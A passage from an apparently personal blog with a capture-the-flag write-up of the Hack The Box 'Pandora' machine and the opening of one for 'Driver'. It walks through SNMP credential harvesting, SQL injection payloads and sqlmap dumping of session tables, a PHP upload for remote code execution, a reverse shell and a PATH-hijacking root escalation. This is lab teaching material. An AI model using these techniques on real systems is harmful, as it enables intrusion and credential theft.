<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkt () {
        mkdir {nmap,content,exploits,scripts}
}
</code></pre></div></div>

<h2 id="recognition">Recognition</h2>

<p>We send one icmp trace to the victim machine, and we can see that we have sent a packet and received that packet back. and through the TTL we can know that the target machine is linux. since linux machines have ttl 64 and windows machines have ttl 128.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura2.png" />
</p>

<p>If you asking why when we receive the packet the ttl shows 63 instead of 64? this is because when we send icmp packet to the machine it goes through a series of intermediary nodes and this causes the ttl to decrease by one digit, and this process is known a traceroute. We can see this if we use the <strong><em>-R</em></strong> parameter.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura3.png" />
</p>

<p>Anyway i have a tool on my system called <strong><em>wichsystem</em></strong> that tells if the machine is linux or windows through the ttl.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura4.png" />
</p>

<p>Wichsystem script.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
#coding: utf-8
</span> 
<span class="kn">import</span> <span class="nn">re</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">subprocess</span>
 
<span class="c1"># python3 wichSystem.py YOURIP 
</span> 
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Uso: python3 "</span> <span class="o">+</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">" &lt;direccion-ip&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
<span class="k">def</span> <span class="nf">get_ttl</span><span class="p">(</span><span class="n">ip_address</span><span class="p">):</span>
 
    <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"/usr/bin/ping -c 1 %s"</span> <span class="o">%</span> <span class="n">ip_address</span><span class="p">,</span> <span class="s">""</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">err</span><span class="p">)</span> <span class="o">=</span> <span class="n">proc</span><span class="p">.</span><span class="n">communicate</span><span class="p">()</span>
 
    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">12</span><span class="p">].</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
 
    <span class="n">ttl_value</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">"\d{1,3}"</span><span class="p">,</span> <span class="n">out</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
 
    <span class="k">return</span> <span class="n">ttl_value</span>
 
<span class="k">def</span> <span class="nf">get_os</span><span class="p">(</span><span class="n">ttl</span><span class="p">):</span>
 
    <span class="n">ttl</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ttl</span><span class="p">)</span>
 
    <span class="k">if</span> <span class="n">ttl</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">ttl</span> <span class="o">&lt;=</span> <span class="mi">64</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Linux"</span>
    <span class="k">elif</span> <span class="n">ttl</span> <span class="o">&gt;=</span> <span class="mi">65</span> <span class="ow">and</span> <span class="n">ttl</span> <span class="o">&lt;=</span> <span class="mi">128</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Windows"</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Not Found"</span>
 
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
 
    <span class="n">ip_address</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
 
    <span class="n">ttl</span> <span class="o">=</span> <span class="n">get_ttl</span><span class="p">(</span><span class="n">ip_address</span><span class="p">)</span>
 
    <span class="n">os_name</span> <span class="o">=</span> <span class="n">get_os</span><span class="p">(</span><span class="n">ttl</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s (ttl -&gt; %s): %s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip_address</span><span class="p">,</span> <span class="n">ttl</span><span class="p">,</span> <span class="n">os_name</span><span class="p">))</span>

</code></pre></div></div>

<h2 id="scanning">Scanning</h2>

<p>Now with nmap we are going to do the scanning process to know what’s ports and services are running on the target machine, with the following parameters.</p>

<table>
  <thead>
    <tr>
      <th>Flags</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-p-</td>
      <td>Means that we want to scan all the ports that exists in tcp and udp which is in total 65,535 ports.</td>
    </tr>
    <tr>
      <td>-sS</td>
      <td>Means that we want tcp syn scan.</td>
    </tr>
    <tr>
      <td>–min-rate 5000</td>
      <td>Means we just want to send packets no slower then 5000 packets per second to discover ports, and with that parameter our scan will be most faster.</td>
    </tr>
    <tr>
      <td>–open</td>
      <td>Means that we want only output the ports with the status open not filtred.</td>
    </tr>
    <tr>
      <td>-vvv</td>
      <td>Means that we want to output more information.</td>
    </tr>
    <tr>
      <td>-n</td>
      <td>Means we don’t want DNS resolution, because sometimes the DNS resolution can take our scan much slower.</td>
    </tr>
    <tr>
      <td>-Pn</td>
      <td>Means that we don’t to ping to discover ports.</td>
    </tr>
    <tr>
      <td>-oG</td>
      <td>Means that we want to save the scan in grapable format to not rescan again, you have more formats to save like nmap, xml, etc.</td>
    </tr>
  </tbody>
</table>

<p>Basically i export the scan in grepable format because I have a function that i define in the ~/.zshrc which is the <strong><em>extractports</em></strong> function, basically it allows me to visualize the ports in a more elegant way and it copies the ports in the clipboard, so this is useful when we are scanning a target machine and it has to much ports and we don’t need to write one by one to scan those ports.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura5.png" />
</p>

<p>The <strong><em>extractPorts</em></strong> script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>extractPorts <span class="o">()</span> <span class="o">{</span>
        <span class="nv">ports</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span><span class="si">)</span><span class="s2">"</span>
        <span class="nv">ip_address</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'</span> | <span class="nb">sort</span> <span class="nt">-u</span> | <span class="nb">head</span> <span class="nt">-n</span> 1<span class="si">)</span><span class="s2">"</span>
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[*] Extracting information...</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;</span> extractPorts.tmp
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] IP Address: </span><span class="nv">$ip_address</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] Open ports: </span><span class="nv">$ports</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
        <span class="nb">echo</span> <span class="nv">$ports</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> clip
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"[*] Ports copied to clipboard</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
        <span class="nb">cat </span>extractPorts.tmp
        <span class="nb">rm </span>extractPorts.tmp
<span class="o">}</span>
</code></pre></div></div>

<h2 id="ports-recognition-and-enumeration">Ports Recognition and Enumeration</h2>

<p>Once we have discovered possible ports, we will perform another scan to recognize the services and versions that use each of these ports. To order to do that we going to use the following parameters or flags:</p>

<table>
  <thead>
    <tr>
      <th>Flags</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-sCV</td>
      <td>Means that we want to use some nmap scripts, in this case to discover the version and services that are running each of those ports.</td>
    </tr>
    <tr>
      <td>-p</td>
      <td>To specify the ports.</td>
    </tr>
    <tr>
      <td>-oN</td>
      <td>Save the scan in nmap format.</td>
    </tr>
  </tbody>
</table>

<p>Remember that nmap have bunch of scripts that we can use, nmap scripts end in <strong><em>.nse</em></strong> extension (nmap script engine).</p>

<p align="center">
<img src="/assets/images/img-ransom/locate.png" />
</p>

<p>Remember that nmap scripts have many categories that we can search for.</p>

<p align="center">
<img src="/assets/images/img-ransom/categories.png" />
</p>

<p>The scan:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Sat May 21 17:47:03 2022 as: nmap -sCV -p22,80 -oN targeted 10.10.11.136
Nmap scan report for Panda.HTB (10.10.11.136)
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 21 17:47:14 2022 -- 1 IP address (1 host up) scanned in 11.12 seconds
</code></pre></div></div>

<p>Ok so let’s access to the website and as you can see the wappalyzer reports some information about the website (services, languges, frameworks, webserver, etc), and we can see a domain called <strong><em>panda.htb</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura6.png" />
</p>

<p>Let’s add this domain on the file <strong><em>/etc/hosts</em></strong> to apply virtual hosting.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura7.png" />
</p>

<p>If we access to the webpage with the that domain we can’t see any difference on the webpage.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura8.png" />
</p>

<p>So let’s try to fuzz this webpage with gobuester specifying the following file extensions with the <strong><em>-x</em></strong> flag, and we can’t find any interesting routes that we can access.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura9.png" />
</p>

<p>In this case i try to fuzz if there some subdomains in that particular domain, but i don’t anything either.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura10.png" />
</p>

<p>Looking the source code of the webpage we can’t see anything interesting.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura11.png" />
</p>

<p>If we scan the target machine with udp we can see that there is one port open running <strong><em>snmp</em></strong> service. The scan can take little bit time, so for this we will going to specify that we want to scan the top most popular ports in UDP to go much faster <strong><em>(“-top-ports=20”)</em></strong>.</p>

<p>The scan:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Sat May 21 17:56:14 2022 as: nmap -sU -top-ports=20 -oN topports 10.10.11.136
Nmap scan report for Panda.HTB (10.10.11.136)
Host is up (0.048s latency).

PORT      STATE  SERVICE
53/udp    closed domain
67/udp    closed dhcps
68/udp    closed dhcpc
69/udp    closed tftp
123/udp   closed ntp
135/udp   closed msrpc
137/udp   closed netbios-ns
138/udp   closed netbios-dgm
139/udp   closed netbios-ssn
161/udp   open   snmp
162/udp   closed snmptrap
445/udp   closed microsoft-ds
500/udp   closed isakmp
514/udp   closed syslog
520/udp   closed route
631/udp   closed ipp
1434/udp  closed ms-sql-m
1900/udp  closed upnp
4500/udp  closed nat-t-ike
49152/udp closed unknown

# Nmap done at Sat May 21 17:56:31 2022 -- 1 IP address (1 host up) scanned in 16.70 seconds
</code></pre></div></div>
<p>So basically snmp (Simple Network Management Protocol) is a protocol used to monitor devices on the network (routers, switches, IoT devices) it’s provides a framework for asking a device about his performance and configuration, no matter what kind of hardware or software is. SNMP is vital for managing networks without SNMP it will be very difficult to network management tools to identify devices and monitoring their performance, it will also be difficult to keep track of changes on the network that can have multiples vendors. By default the SNMP protocol is not enabled for security reasons, so you will need to enabled manually on your network.</p>

<p>SNMP has a simple architecture based on the client-server model, the servers are called <strong><em>managers</em></strong> they collect process information about the devices on the network and the client are called <strong><em>agents</em></strong> (which are type of devices or device components connected to the network that you wanted to collect information). Data collected by the managers throught SNMP has a tree like hierarchy, and this data tree has multiple braches called management information bases or <strong><em>MIBs</em></strong>, this is used to defined a group of data points that can be collected from specific agents (let’s the manager want to know some information about devices on the network, it will send a request form the agents and that request will be MIBs, and this is basically a plain-text file that contain instructions that the manager needs to know info about the devices, and the MIBs it will be provide by our agents think this like drivers that need for our devices, so in this case the provider of your snmp agent will give a MIB for the device). And this group of data points are called objectes indentifiers or <strong><em>OIDs</em></strong> (so lets aussume that OIDs are kind of IP addresses for the devices), so basically a MIB is a logical grouping of OIDs.</p>

<p align="center">
<img src="/assets/images/img-pandora/treeoid.png" />
</p>

<p>OIDs example:</p>

<p align="center">
<img src="/assets/images/img-pandora/oidexample.png" />
</p>

<p>There are currently three versions of SNMP, each with differents features specially on the security side.</p>

<p><strong><em>SNMPv1 and v2/2c</em></strong>: the v1 will create in 80s and it has weak security, it uses default credentials and it was not encrypted and v2 it will have better performance but it will not encrypted. And both versions of this protocol send trafic in plain text over the network and the attackers can see passwords and usernames in plain-text and also the v2 uses a community string as authentication.</p>

<p><strong><em>SNMPv3</em></strong>: Uses a better authentication and the information travels encrypted over the network (we can perform dictionary attack but it will be more harder to find credentials and some information about the devices).</p>

<p>Community String: In v1 and v2 you don’t need a username and password in order to access the information saved on MIB files, you just need to know the community string to access those information on the MIB and sometimes with the community string you can see some credentials on v3. There are two types of community string:</p>

<p><strong><em>Public</em></strong>: you can just read the information on the MIB.</p>

<p><strong><em>Private</em></strong> you can Read/Write in general.</p>

<p>So in v1 and v2/2c if you use a bad community string the server will not respond. To guess the communitry string the attacker can perform a brute force attack to know, but in some cases organizations and corporate env uses <strong><em>public</em></strong> community string by default.</p>

<p>The SNMP agent receives requests on UPD on the port <strong><em>161</em></strong> and the manager receives notifications (Traps and inforequests) on the port <strong><em>162</em></strong>, if we used this protocol on the TLS protocol the request will be received on the port <strong><em>10161</em></strong> and the notifications are sent to the port <strong><em>10162</em></strong>.</p>

<p>More about SNMP: <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp">resource1</a>, <a href="https://www.dpstele.com/snmp/what-does-oid-network-elements.php">resource2</a>, <a href="https://www.ccapitalia.net/descarga/docs/1998-gestion-snmp-v1.pdf">resource3 (Spanish)</a></p>

<p>So in this case we will enumarete the snmp protocol with namp specifyin the following flags, and as you can see the namp recognization scripts (which we defined with the flags <strong><em>-sCV</em></strong>) it will report us that the target machine is using v1 and v3 of SMNP and it’s says <strong><em>public</em></strong> which means that the community strings its public and that means that we can see information in plain-text.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura12.png" />
</p>

<p>So the nmap scan reports us some process that are running on the target machine, and if you continue to scrolling we can see some credentials. SNMP has a lot of info about the host and one of them is the process that are running on the host and sometimes those processes can contain passwords.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura13.png" />
</p>

<p>And if we continue to scrolling we can see a process with a backup file which we will use to escalate privileges when get access to the machine.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura14.png" />
</p>

<p>We can perform the same enumeration as we did with namp with the command <strong><em>snmpwalk</em></strong> specifying the version of the snmp and the community string with the flag <strong><em>-c</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura15.png" />
</p>

<p>The <strong><em>snmpwalk</em></strong> command it can be slower, in this case we can use the command <strong><em>snmpbulkwalk</em></strong> to run the enumeration much faster. I recommed to use this two command instead enumerating with nmap because it will gives us more information and it’s much faster then nmap.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura16.png" />
</p>

<p>We can see that there is a user called <strong><em>daniel</em></strong> that we saw before connecting via ssh, so let’s try to connect via ssh using those credentials as we saw before.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura17.png" />
</p>

<p>And as we can see it’s work’s, we can access with ssh on the target machine with the user daniel. So in this case on the SNMP enumaration it will contain ssh login credentials of the user daniel.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura18.png" />
</p>

<p>There is no files and directories on the home direcotry of the user daniel, if we list all the users on the system we can see that there is user called <strong><em>matt</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura19.png" />
</p>

<p>If we access on the home directory of the user <strong><em>matt</em></strong> we can see that there is the first flag, but we we don’t have permission to read that file and get the flag.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura20.png" />
</p>

<p>And there is any sudo permission on the user that we are login which is “daniel”, we can’t view the cronjobs and we can’t access on root directory. So here we need to access with the user “matt” in order to escalate privileges.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura21.png" />
</p>

<p>If we search for files that contain SUID permission on the system we can see that there is a binary called <strong><em>pandora_backup</em></strong> (as we saw before on the snmp enumeration) which is created by the root user, but we don’t have permission to run that binary, so definitely we need to access with the user matt.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura22.png" />
</p>

<p>In this case what i am going to do is run <strong><em>linpeas</em></strong> to go much faster to escalate privileges. So let’s download the linpeas.sh binary and transfer to the target machine and add execute permission and then execute. To download linpeas <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20220522">here</a></p>

<p align="center">
<img src="/assets/images/img-pandora/captura23.png" />
</p>

<p>So linpeas it’s reports that this machine is vulnerable to <strong><em>pwnkit</em></strong>, but in this case we don’t escalate privileges with this vulnerability.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura24.png" />
</p>

<p>If we continue scrolling down linpeas reports the process that are running on the target machine, this processes we saw before when we enumerate snmp with namp.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura25.png" />
</p>

<p>If we can continue scrolling down we can see that there is a site enbled on the apache service on localhost on the target machine, and it will redirect a subdomain called <strong><em>pandora.panda.htb</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura26.png" />
</p>

<p>Let’s add this domain on the hosts file in our machine to apply vhost.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura27.png" />
</p>

<p>But if we access with this domain it will redirect the same webpage as we access before. So this domain is valid on the localhost of the target machine.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura28.png" />
</p>

<p>So let’s apply local port forwarding with ssh with the following command.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura29.png" />
</p>

<p>And now if we access on localhost in our browser we can access the webpage of the localhost of the target machine, and as you can see the webpage it’s a pandora fms which is used to monitor network and the devices so thats why the target machine used the protocol snmp.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura30.png" />
</p>

<p>If we try to login with the credentials of the user “daniel” that we use before it will not allow to login, and it popups a error messages that the users can only use the API, for now we don’t know if this cms uses some kind of API to login and valid users.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura31.png" />
</p>

<p>Using <strong><em>searchsploit</em></strong> we can see that some version of pandora fms it’s vulnerable, and the version 7 it’s vulnerable to RCE and SQLi.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura32.png" />
</p>

<p>If we scroll down on that webpage it will tell us the version of this cms, in this case the version it’s 7 so it’s vulnerable.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura33.png" />
</p>

<h2 id="exploitation">Exploitation</h2>

<p>If we search in google <strong><em>pandora fms v7.0NG exploit</em></strong> we can find the following article that explains how we can exploit unauthenticated SQLi and RCE. Here is the <a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/">article</a></p>

<p>So basically in that article indicate that the SQLi it’s vulnerable on the route <strong><em>/include/chart_generanador.php</em></strong> sending the request with a session id (<strong><em>session_id</em></strong>). So if we access on that particular route it’s says “Access is not granted”.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura34.png" />
</p>

<p>In this case i try inject some sql syntax on the url, and when i add this sql syntax <strong><em>1’ or 1=1– -</em></strong> that message that says “Access is not granted” will disappear. So it’s like it is injectable with some sql syntax.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura35.png" />
</p>

<p>In this case i intercept the request with burpsuite and remove the following headers.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura36.png" />
</p>

<p>And then save this request in a file.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura37.png" />
</p>

<p>And now with <strong><em>sqlmap</em></strong> we will going dump the tables and the databases that may contain on this machine.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura38.png" />
</p>

<p>And we can find a table called <strong><em>tsessions_php</em></strong> in the pandora database, so if we try to dump this table using the following command <strong><em>sqlmap -r request.req –batch -D pandora -T tsessions_php –dump</em></strong> we can find the <strong><em>sessions id</em></strong> of the users.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura39.png" />
</p>

<p>Once we get the session id let’s try to use them to login with the user.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura40.png" />
</p>

<p>In this case i try to use the session id of the user matt and admin but it will not allow me to access with those users instead it will appear an error message.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura41.png" />
</p>

<p>So after researching and testing to inject some sql syntax it will works with <strong><em>union injection</em></strong>. The syntax is the following: <code class="language-plaintext highlighter-rouge">1' union select 1,2,'id_usuario|s:5:"admin";'-- -"</code>.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura42.png" />
</p>

<p>And now if we access on the login page again we are able to access with the admin user.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura43.png" />
</p>

<p>So what’s happen here that it will not expect the session id of the user instead it accept the data column to a user as i am marking on the image:</p>

<p align="center">
<img src="/assets/images/img-pandora/sqli.png" />
</p>

<p>So if we go to the admin tools we have a section to upload a file.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura44.png" />
</p>

<p>In this case let’s upload this php file to get RCE, as we saw before that the version 7 of pandora fms it’s vulnerable to RCE.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura45.png" />
</p>

<p>Now let’s upload the payload.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura46.png" />
</p>

<p>And the payload it will store on the directory images.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura47.png" />
</p>

<p>So we click on that file and as you can see we are able to execute command remotly.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura48.png" />
</p>

<p>And if we execute the command <strong><em>ifconfig</em></strong> we can see the ip address of the target machine.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura49.png" />
</p>

<p>Now let’s establish a reverse shell, we can to this multiples ways in my case i am going to use python.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura50.png" />
</p>

<p>In this case i am using <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">the payload all the things</a> repo to establish a reverse shell. Copy and paste the python payload and specify your attacker ip address and listening port.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura51.png" />
</p>

<p>Now if we go back in our netcat listener we have a connection and we are in.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura52.png" />
</p>

<p>So let’s setup more appropriate shell.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura53.png" />
</p>

<p>Let’s export two env variable which is one <strong><em>xterm</em></strong> and <strong><em>bash</em></strong>, now we are able to use command like <strong><em>clear</em></strong> and we can use shortcut like <strong><em>ctrl+c</em></strong>, <strong><em>ctrl+l</em></strong>, etc.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura54.png" />
</p>

<p>And now we if we move on the home directory of the user “matt” we have a permission to read the <strong><em>user.txt</em></strong> flag.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura55.png" />
</p>

<h2 id="privesc">PrivEsc</h2>

<p>So before we saw a binary called <strong><em>pandora_backup</em></strong> but we still don’t have permission to execute this binary.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura56.png" />
</p>

<p>This shell it will get me some issues so i decide to generate ssh key on the target machine, but when i try to access with private it will ask me for a password a little bit weird.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura57.png" />
</p>

<p>So then i decide to upload my public ssh key of my attacker machine and then i able to ssh with the user matt.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura58.png" />
</p>

<p>And then i execute again the <strong><em>pandora_backup</em></strong> binary and now it allow me to execute it, it’s a little bit weird because i am still login with the matt user maybe it’s because the reverse shell that i establish before. So this binary allow us to backups files that are specified by the root user.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura59.png" />
</p>

<p>So if we look the content of this binary using the command <strong><em>ltrace</em></strong> we can that is using <strong><em>tar</em></strong> to compress the files and send it to a file called <strong><em>pandora_backup.tar.gz</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura60.png" />
</p>

<p>First of all we know a important thing that the file is SUID and the owner of that file is root, so what we can do here is try to use PATH hijacking attack. So move to the <strong><em>tmp</em></strong> directory and if we echo the actual PATH variable we see that it first prioritizes the path <strong><em>/usr/local/sbin</em></strong>. i recommend to save the actual PATH variable if we mess up something.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura61.png" />
</p>

<p>Before we saw that the pandora backup file is using the <strong><em>tar</em></strong> command, so here we are going to create a file called “tar” and inside of that file we indicate that we want to execute a <strong><em>sh</em></strong> shell and then add execute permission.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura62.png" />
</p>

<p>Now we are going to export the <strong><em>PATH</em></strong> variable for it to be worth the <strong><em>/tmp</em></strong> directory. So basically what we are doing here is a simple PATH hijacking, we are specifying that when we execute the binary <strong><em>pandora_backup</em></strong> it will start from the path <strong><em>/tmp</em></strong> where we have our little script.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura63.png" />
</p>

<p>And now if we execute again the binary <strong><em>pandora_backup</em></strong> it will execute a <strong><em>sh</em></strong> shell and we are root. Remember that this happens because the binary <strong><em>pandora_backup</em></strong> have SUID permission and the owner is the root user and because of that we are able to exploit this vulnerablity and converd to the root user, and now we can visualize the last flag which is <strong><em>root.txt</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura64.png" />
</p>

<p>And with that we <strong><em>pwned!!!!</em></strong> the machine.</p>

<p align="center">
<img src="/assets/images/img-pandora/pwned.png" />
</p>

<h2 id="pandora-writeup-in-real-time">Pandora Writeup in real time</h2>

<iframe width="560" height="315" src="https://www.youtube.com/embed/dLi0c4aCDas" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>]]></content><author><name>bynafrez</name></author><category term="CTF" /><category term="web pentesting" /><category term="Hack the box" /><category term="CVE" /><category term="SQLi" /><category term="RCE" /><category term="CMS exploit" /><summary type="html"><![CDATA[Pandora is a linux machine with easy level of difficulty both in explotation phase and PrivESC, and this machine runs snmp service through UDP...]]></summary></entry><entry><title type="html">HTB - Driver</title><link href="http://0.0.0.0:4000/htb-driver/" rel="alternate" type="text/html" title="HTB - Driver" /><published>2022-05-01T00:00:00-04:00</published><updated>2022-05-01T00:00:00-04:00</updated><id>http://0.0.0.0:4000/htb-driver</id><content type="html" xml:base="http://0.0.0.0:4000/htb-driver/"><![CDATA[<p>Driver is a windows machine with easy level of difficulty both in exploitation phase and privilage escalation this machine is based to attacking printers on a corporate network, we will going to start to create and upload a malicious scf file which allows to get user ntlmv2 hash which then we will crack it to gain access to the machine, and we will escalate privilage to exploiting the vulnerability called PrintNightMare.</p>

<p align="center">
<img src="/assets/images/img-driver/portada.png" />
</p>

<p>Machine matrix:</p>

<p align="center">
<img src="/assets/images/img-driver/matrix.png" />
</p>

<p>First of all we are going to create a directory with the name of the machine, and with the command “mkt” i am gonna create a following directories.</p>

<p align="center">
<img src="/assets/images/img-driver/captura1.png" />
</p>

<p>The <strong><em>mkt</em></strong> command is a function that i defined on the file <strong><em>~/.zshrc</em></strong> that allows me to create the following directories, if you using bash in your case is the file <strong><em>~/.bashrc</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-driver/captura2.png" />
</p>

